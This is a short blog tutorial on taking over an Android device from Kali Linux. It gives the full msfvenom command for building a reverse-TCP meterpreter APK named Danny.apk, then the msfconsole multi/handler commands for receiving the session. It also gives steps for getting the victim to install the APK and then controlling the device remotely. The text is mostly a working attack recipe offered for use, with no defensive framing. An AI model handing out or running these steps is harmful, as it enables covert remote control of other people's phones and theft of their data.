Exploiting Android using Kali Linux 

 Hello everyone, this blog is related to exploiting Android system using Kali Linux.

So, basically we need two operating systems, First one is kali(attacker) and second one is Android(victim).

This Practical works when both of the machines are in same network.

So. I have installed Kali-linux in Virtualbox and I am using Genymotion for Android.
And I have managed to put the both machines on same network, you have to do same if you are also trying to do same as me. Otherwise Important is both the machines has to be on same network,
This also works if you have host machine kali and on other side you have Android Device with you.

You can also install kali on Virtualbox and set it to NAT network.

For surety u can ping the Android Device machine from Kali to check that the machines are on same network or not.

Practical Starts Here - 

1. go to kali terminal and type the following command.
 type your kali ip instead of 170.9.210.105

msfvenom –p android/meterpreter/reverse_tcp LHOST=170.9.210.105 LPORT=4444 R> ~/Desktop/Danny.apk





2. Now the Danny.apk file was generated on desktop.
3. Type following Commands in terminal.(don't close the terminal window after executing last command)
 type your kali ip instead of 170.9.210.105

   msfconsole



   

   use multi/handler
   set PAYLOAD android/meterpreter/reverse_tcp
   set LHOST 170.9.210.105
   set LPORT 4444
   exploit






4.Now Manage to move that Danny.apk file from your kali to Android Device.
Follow the below steps - 



5. Tick all the options and click install





6. After installing just click it once






7. after execution of that file, you will see that the kali got the session,
You will see the following message.






Now you can control the Android Device from meterpreter.
     I am writing command sys info, this command show me the system info of that system,




    there are bunch of more commands available here, you can see them by typing help.
Thats it You are in that System.



Thank You 
Arpit Panchal...
